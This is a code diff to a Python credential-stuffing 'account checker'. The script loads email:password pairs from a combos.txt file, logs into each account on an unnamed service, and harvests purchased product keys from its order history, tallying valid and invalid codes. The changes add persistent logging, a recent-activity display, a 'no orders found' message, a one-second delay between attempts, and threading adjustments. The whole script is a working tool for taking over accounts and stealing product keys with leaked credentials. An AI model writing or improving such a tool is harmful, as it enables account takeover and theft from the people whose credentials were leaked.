@@ -9,6 +9,20 @@ valid_codes = 0
 invalid_codes = 0
 accounts = []
 
+# Persistent log to store messages
+persistent_log = []
+
+def log_and_print(message):
+    """
+    Log message to persistent log and print it.
+    
+    Args:
+        message (str): Message to log and print
+    """
+    global persistent_log
+    persistent_log.append(message)
+    print(message)
+
 def load_accounts():
     """
     Load accounts from the 'combos.txt' file.
@@ -26,15 +40,15 @@ def load_accounts():
                     email, password = line.split(':', 1)  # Split only once
                     accounts.append((email, password))
                 else:
-                    print(f"Invalid line skipped: {line}")
-        print(f"Loaded {len(accounts)} accounts from combos.txt.")
+                    log_and_print(f"Invalid line skipped: {line}")
+        log_and_print(f"Loaded {len(accounts)} accounts from combos.txt.")
     except FileNotFoundError:
-        print("Error: 'combos.txt' file not found.")
+        log_and_print("Error: 'combos.txt' file not found.")
         return []
     return accounts
 
 def check_purchased_codes(auth_token, email, password):
-    print(f"Checking {email}")
+    log_and_print(f"Checking {email}")
     global valid_codes, invalid_codes
     headers = {
         'Authorization': f'Bearer {auth_token}',
@@ -51,8 +65,10 @@ def check_purchased_codes(auth_token, email, password):
         orders = response.json()
         codes = []
         
+        found_orders = False
         for order in orders.get('orderHistoryItems', []):
             if 'productKey' in order:
+                found_orders = True
                 code_info = {
                     'product_name': order.get('productTitle', 'Unknown'),
                     'code': order['productKey']
@@ -67,18 +83,23 @@ def check_purchased_codes(auth_token, email, password):
                 
                 # Display a message for valid codes
                 if order['productKey'] != 'invalid or redeemed':
-                    print(f"Found code: {code_info['code']} | valid")
+                    log_and_print(f"Found code: {code_info['code']} | valid")
                     valid_codes += 1
                 else:
-                    print(f"Found code: {code_info['code']} | invalid")
+                    log_and_print(f"Found code: {code_info['code']} | invalid")
                     invalid_codes += 1
+        
+        # If no orders found, log the message
+        if not found_orders:
+            log_and_print(f"No Orders Found, Checking next account")
 
     except requests.exceptions.RequestException as e:
         invalid_codes += 1
-        print(f"Error checking purchased codes for {email}: {str(e)}")
+        log_and_print(f"Error checking purchased codes for {email}: {str(e)}")
         return []
 
-    time.sleep(0.5)
+    # Add 1-second delay between account checks
+    time.sleep(1)
     return codes
 
 def authenticate(email, password):
@@ -97,14 +118,14 @@ def authenticate(email, password):
         auth_token = get_auth_token(email, password)
         return auth_token
     except Exception as e:
-        print(f"Error authenticating {email}: {str(e)}")
+        log_and_print(f"Error authenticating {email}: {str(e)}")
         return None
 
 def update_ui():
     """
-    Update the UI with the current statistics.
+    Update the UI with the current statistics and persistent log.
     """
-    global checked, valid_codes, invalid_codes
+    global checked, valid_codes, invalid_codes, persistent_log
     while True:
         os.system('clear')
         print("================================")
@@ -113,6 +134,10 @@ def update_ui():
         print(f"Accounts Checked: {checked}/{len(accounts)}")
         print(f"Valid Codes: {valid_codes}")
         print(f"Invalid Codes: {invalid_codes}")
+        print("\n--- Recent Activity ---")
+        # Display last 10 log messages
+        for msg in persistent_log[-10:]:
+            print(msg)
         print("================================")
         time.sleep(1)
 
@@ -124,6 +149,7 @@ def main():
     
     # Start the UI update thread
     ui_thread = threading.Thread(target=update_ui)
+    ui_thread.daemon = True  # Allow thread to exit when main program ends
     ui_thread.start()
     
     # Check accounts and codes
@@ -133,8 +159,9 @@ def main():
             check_purchased_codes(auth_token, email, password)
         checked += 1
     
-    # Wait for the UI thread to finish
-    ui_thread.join()
+    # Optional: Keep the main thread running to maintain UI
+    while True:
+        time.sleep(1)
 
 if __name__ == "__main__":
     if not os.path.exists('codes.txt'):
